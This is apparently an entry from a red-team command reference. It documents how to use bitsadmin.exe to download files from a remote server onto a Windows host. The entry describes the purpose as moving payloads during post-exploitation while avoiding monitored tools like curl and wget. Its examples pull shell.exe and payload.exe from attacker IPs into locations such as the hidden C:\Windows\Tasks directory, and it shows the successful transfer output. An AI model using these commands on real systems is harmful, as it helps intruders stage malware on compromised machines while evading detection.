---
id: 147362a9-7135-4ebb-8310-c12b8a5e2600
type: command
executor: command_prompt
data: >-
  bitsadmin.exe /transfer "foo" /download http://$_REMOTE_IP/$_FILENAME
  C:\_$DEST_DIR\$_FILENAME
output: >-
  C:\>bitsadmin.exe /transfer "foo" /download http://10.10.10.100/shell.exe
  C:\Windows\Tasks\shell.exe 

  DISPLAY: 'foobar' TYPE: DOWNLOAD STATE: TRANSFERRED

  PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7168 / 7168 (100%)

  Transfer complete.
created_at: '2019-11-20T19:04:07.107221+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - file-transfer
  - network
verified: true
validated: true
---

# bitsadmin-download-file-from-remote-web-server

## Command

```command_prompt
bitsadmin.exe /transfer "foo" /download http://$_REMOTE_IP/$_FILENAME C:\_$DEST_DIR\$_FILENAME
```

## Description

This command creates a temporary BITS job named "foo" to download a specified file from a remote HTTP server to a local Windows directory. It's useful for transferring payloads during post-exploitation without using monitored tools like wget or curl.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_REMOTE_IP | IP address or hostname of the remote server hosting the file | Yes |
| $_FILENAME | Name of the file to download from the remote server | Yes |
| $_DEST_DIR | Local directory path where the file will be saved (must exist and be writable) | Yes |
| /transfer "foo" | Creates and names the job ("foo" is arbitrary and temporary) | Built-in |
| /download | Specifies the operation as a download from URL to local path | Built-in |

## Examples

### Basic Usage

```command_prompt
bitsadmin.exe /transfer "DownloadJob" /download http://10.10.10.100/payload.exe C:\Temp\payload.exe
```

### Advanced Usage

To download to a hidden system directory:

```command_prompt
bitsadmin.exe /transfer "HiddenDL" /download http://192.168.1.50/shell.exe C:\Windows\Tasks\shell.exe
```

## Expected Output

```
C:\>bitsadmin.exe /transfer "foo" /download http://10.10.10.100/shell.exe C:\Windows\Tasks\shell.exe 
DISPLAY: 'foobar' TYPE: DOWNLOAD STATE: TRANSFERRED
PRIORITY: NORMAL FILES: 1 / 1 BYTES: 7168 / 7168 (100%)
Transfer complete.
```

The file is saved to the specified path upon completion.

## Related

- [[tools/BITSAdmin]]
- [[commands/bitsadmin-list-jobs]] (for monitoring related jobs)
